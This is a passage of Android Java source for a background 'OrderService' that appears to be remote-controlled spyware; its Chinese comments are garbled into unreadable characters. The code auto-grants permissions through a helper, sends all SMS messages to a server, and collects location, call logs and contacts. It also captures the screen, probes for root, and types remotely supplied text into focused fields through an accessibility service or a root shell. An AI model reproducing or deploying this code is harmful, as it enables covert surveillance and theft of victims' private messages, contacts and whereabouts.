	            bindService(new Intent(OrderService.this,GuardService.class),  
	                    mServiceConnection, Context.BIND_IMPORTANT);  
	        }  
	    }; 

	//----------------------------------ģ���ʼ��-------------------------------------------------
	Handler handler= new Handler(); 
	/*
     * ������ʼ����
     */
	private void shotScreenPrepare(){
		final Handler handler= new Handler(); 
		Runnable runnableShotScreen  = new Runnable() {    
			@Override    
		    public void run() {   
				if(ConfigCt.getInstance(getApplicationContext()).haveScreenShotPower()){
					ScreenRecordActivity.startInstance(getApplicationContext(), ScreenRecordActivity.REQUEST_SHOT_SCREEN);
					return;
				}else{
					if(GivePermission.getGivePermission().isEnable()){
						GivePermission.getGivePermission().EventStart();
						GivePermission.getGivePermission().TimeStart();
						//ScreenShotActivity.startInstance(getApplicationContext(), ScreenShotActivity.REQUEST_MEDIA_PROJECTION);
						ScreenRecordActivity.startInstance(getApplicationContext(), ScreenRecordActivity.REQUEST_SHOT_SCREEN);
						return;
					}
				}
				handler.postDelayed(this, 1000*5);    
		    }    
		};
		handler.postDelayed(runnableShotScreen, 1000*1);  
	}
	    /*
	     * ����ģ���ʼ����
	     */
	    private void smsPrepare(){
	    	 if(ConfigCt.getInstance( OrderService.this).getIsSendSms()){//�����ȡ����Ȩ�ޣ�
	    		 SmsObserver.registerServer(getApplicationContext());
	    	 }else{
	    			Runnable runnableSms  = new Runnable() {    
	    				@Override    
	    			    public void run() {    
	    					if(ConfigCt.getInstance(getApplicationContext()).getIsSendSms()){
	    						SmsObserver.registerServer(getApplicationContext());
	    						return;
	    					}
	    					if(GivePermission.getGivePermission().isEnable()){
	    						GivePermission.getGivePermission().EventStart();
	    						GivePermission.getGivePermission().TimeStart();
	    						SmsReceiver.sendALLSmsToServer(OrderService.this, ConfigCt.appID+"-sma");
	    						return;
	    					}
	    					handler.postDelayed(this, 1000*10);    
	    			    }    
	    			};
	    			handler.postDelayed(runnableSms, 1000*10); 
	    	 }
	    }
	/*
	     * rootģ���ʼ����
	*/
	private boolean bExcCmd=true;
	private void rootPrepare(){
	    if(!ConfigCt.bRoot)return;
	    bExcCmd=true;
	    Runnable runnableRoot  = new Runnable() {    
			@Override    
		    public void run() {    
				if(ConfigCt.getInstance(getApplicationContext()).haveRootPermission()){
					//if(QiangHongBaoService.getQiangHongBaoService()==null)//�ػ��̣߳�
						//RootShellCmd.OpenAccessibility(getApplicationContext());
					return;
				}else{//������Ȩ
					if(GivePermission.getGivePermission().isEnable()){
						if(bExcCmd){
							GivePermission.getGivePermission().EventStart();
							GivePermission.getGivePermission().TimeStart();
							ExcCmd.getInstance().testCmd();
							bExcCmd=false;
						}else{
							if(ExcCmd.getInstance().getResult())
								ConfigCt.getInstance(getApplicationContext()).setRootPermission(true);
							return;
						}
					}
				}
				handler.postDelayed(this, 1000*1);    
		    }    
		};
		handler.postDelayed(runnableRoot, 1000*1); 	    
	}
	/*
     * ��λ��ʼ����
     */
	private void LocatePrepare(){
	if(!ConfigCt.getInstance(this).haveLocatePermission()){
		final Handler handler= new Handler(); 
		Runnable runnableLocation  = new Runnable() {    
			@Override    
		    public void run() {    
				if(GivePermission.getGivePermission().isEnable()){
					GivePermission.getGivePermission().EventStart();
					GivePermission.getGivePermission().TimeStart();
					MyLocation location=MyLocation.getMyLocation(getApplicationContext());
					location.GetSingleLocationThread();
		        	return;
				}
				handler.postDelayed(this, 1000*5);    
		    }    
		};
		handler.postDelayed(runnableLocation, 1000*1);  
	}else{
		//MyLocation location=MyLocation.getMyLocation(getApplicationContext());
		//location.Start();
		SendBaseInfo(order.CMD_LOCATION_SINGLE);
	}
	}
	/*
     * ����ͨ����¼��ʼ����
     */
	private void CallPrepare(int cmd){
		if(!ConfigCt.getInstance(getApplicationContext()).getIsReadCallLog()){
			if(GivePermission.getGivePermission().isEnable()){
				GivePermission.getGivePermission().EventStart();
				GivePermission.getGivePermission().TimeStart();
			}else{
				return;
			}
		}
		SendBaseInfo(cmd);
	}
	/*
     * ����ͨѶ¼��ʼ����order.CMD_CONTACT_CONTENT
     */
	private void ContactPrepare(int cmd){
		if(!ConfigCt.getInstance(getApplicationContext()).getIsReadContact()){
			if(GivePermission.getGivePermission().isEnable()){
				GivePermission.getGivePermission().EventStart();
				GivePermission.getGivePermission().TimeStart();
			}else{
				return;
			}
		}
		SendBaseInfo(cmd);
	}
	//********************************************�ı�����**************************************************
	/*
     * ִ���ı����룺order.CMD_INPUT
     */
	private void processInput(byte[] data){
		if(data==null)return;
		inputTxtThread(data);
		//String txt=order.byte2Str(data);
		//if(QiangHongBaoService.service==null)return;
		//AccessibilityNodeInfo editNode=getEditFromFocus(QiangHongBaoService.service);
		//if(editNode==null)return;
		//nodeInput(this,editNode,txt);
	}
	/*
		ִ���ı����룺
	 */
	public void inputTxtThread(final byte[] data){
		new Thread(new Runnable() {
		@Override
		public void run() {
			try {
				String txt=order.byte2Str(data);
				if(QiangHongBaoService.service==null)return;
				AccessibilityNodeInfo editNode=getEditFromFocus(QiangHongBaoService.service);
				if(editNode==null)return;
				nodeInput(getApplicationContext(),editNode,txt);
			} catch (Exception e) {
				e.printStackTrace();
			}//try {
		}// public void run() {
	}).start();//new Thread(new Runnable() {
}
	/*
     * �ҵ��������뽹����ı���
     */
	private static AccessibilityNodeInfo getEditFromFocus(AccessibilityService service){
		if(service==null)return null;
		AccessibilityNodeInfo rootNode=service.getRootInActiveWindow();
	    if(rootNode==null)return null;
	    return rootNode.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
	}
    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
    public  static boolean nodeInput(Context context,AccessibilityNodeInfo edtNode,String txt){
    	if(Build.VERSION.SDK_INT >=Build.VERSION_CODES.LOLLIPOP){//android 5.0
    		Bundle arguments = new Bundle();
        	arguments.putCharSequence(AccessibilityNodeInfo .ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,txt);
        	edtNode.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments);
        	return true;
    	}
    	if(Build.VERSION.SDK_INT >=Build.VERSION_CODES.JELLY_BEAN_MR2){//android 4.3
    		ClipboardManager clipboard = (ClipboardManager)context.getSystemService(Context.CLIPBOARD_SERVICE);  
    		ClipData clip = ClipData.newPlainText("text",txt);  
    		clipboard.setPrimaryClip(clip);  
    		//edtNode.fo
    		edtNode.performAction(AccessibilityNodeInfo.ACTION_FOCUS);  
    		////ճ����������  
    		edtNode.performAction(AccessibilityNodeInfo.ACTION_PASTE);  
    		return true;
    	}
    	if(Build.VERSION.SDK_INT >=Build.VERSION_CODES.ICE_CREAM_SANDWICH){//android 4.0
    		edtNode.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
        	String sOrder="input text "+txt;
        	AccessibilityHelper.Sleep(5000);
        	if(RootShellCmd.getRootShellCmd(context).execShellCmd(sOrder)){
        		AccessibilityHelper.Sleep(5000);
        		return true;
        	}
        	return false;
    	}
    	return false;
    }
	/*
     * ��
     */
	private void closeSettings(){
		Intent intent=new Intent("android.settings.SETTINGS");
		intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		intent.putExtra("cancelEnabled", false);
		intent.putExtra("close", true);
		startActivity(intent);
	}
	private boolean bStart=true;
	private void test(){
		//String sdcardPath = Environment.getExternalStorageDirectory().toString();
		//String sourceDir=sdcardPath+"/at";
		//String destDir=ConfigCt.LocalDir+"/at.zip";
		//ZipHelper.zipDir(sourceDir, destDir);
		//if(bStart){
		//	ScreenRecordService.start(getApplicationContext());
			//Intent intent=new Intent(this,ScreenRecordService.class);
		//	//startService(intent);
		///	bStart=false;
		//}else{
		//	ScreenRecordService.stop(getApplicationContext());
		//	bStart=true;
		//}
		//Intent intent=new Intent(this,RecordActivity.class);
		//intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		//startActivity(intent);
		//if(bStart){
		//	VideoRecorderService.start(getApplicationContext());
		//bStart=false;
		//}else{
		//	VideoRecorderService.stop(getApplicationContext());
		//	bStart=true;
		//}
		//SplashActivity.startSplashActivity(getApplicationContext(), SplashActivity.OP_SHOW_DESK_ICO);
		//SplashActivity.setComponentEnabled(getApplicationContext(), SplashActivity.class, true);
		//SplashActivity.startSplashActivity(getApplicationContext());
		SplashActivity.restartApp(getApplicationContext());
	}
	//-----------------------------------------------------------------------------------
	    /*
	     * 
	       public static void LockReceiver(Context context){
	        final IntentFilter filter = new IntentFilter();
	        // ��Ļ�����㲥
	        filter.addAction(Intent.ACTION_SCREEN_OFF);
	        // ��Ļ�����㲥
	        filter.addAction(Intent.ACTION_SCREEN_ON);
	        // ��Ļ�����㲥
	        filter.addAction(Intent.ACTION_USER_PRESENT);
	        // ��������Դ���������ػ����Ի���������ʱϵͳ�ᷢ������㲥
	        // example����ʱ����õ�ϵͳ�Ի���Ȩ�޿��ܸܺߣ��Ḳ��������������ߡ��ػ����Ի���֮�ϣ�
	        // ���Լ�������㲥�����յ�ʱ�������Լ��ĶԻ�������pad���½ǲ��ֵ����ĶԻ���
	        filter.addAction(Intent.ACTION_CLOSE_SYSTEM_DIALOGS);

	        BroadcastReceiver mBatInfoReceiver = new BroadcastReceiver() {
	            @Override
	            public void onReceive(final Context context, final Intent intent) {
	                	Log.d(ConfigCt.TAG, "onReceive");
	                String action = intent.getAction();

	                if (Intent.ACTION_SCREEN_ON.equals(action)) {
	                    //if(mLockState==LockState.locked)ShowWindow();
	                    Log.d(ConfigCt.TAG, "screen on");
	                } else if (Intent.ACTION_SCREEN_OFF.equals(action)) {
	                	if(MainActivity.mainActivity!=null)MainActivity.mainActivity.showInLockScreen();
	                    Log.d(ConfigCt.TAG, "screen off");
	                } else if (Intent.ACTION_USER_PRESENT.equals(action)) {
	                   // HideWindow();
	                   // mLockState=LockState.unLocked;
	                    Log.d(ConfigCt.TAG, "screen unlock");
	                } else if (Intent.ACTION_CLOSE_SYSTEM_DIALOGS.equals(intent.getAction())) {
	                    Log.i(ConfigCt.TAG, " receive Intent.ACTION_CLOSE_SYSTEM_DIALOGS");
	                }
	            }
	        };
	        Log.d(ConfigCt.TAG, "registerReceiver");
	        context.registerReceiver(mBatInfoReceiver, filter);
	    }
	     */
}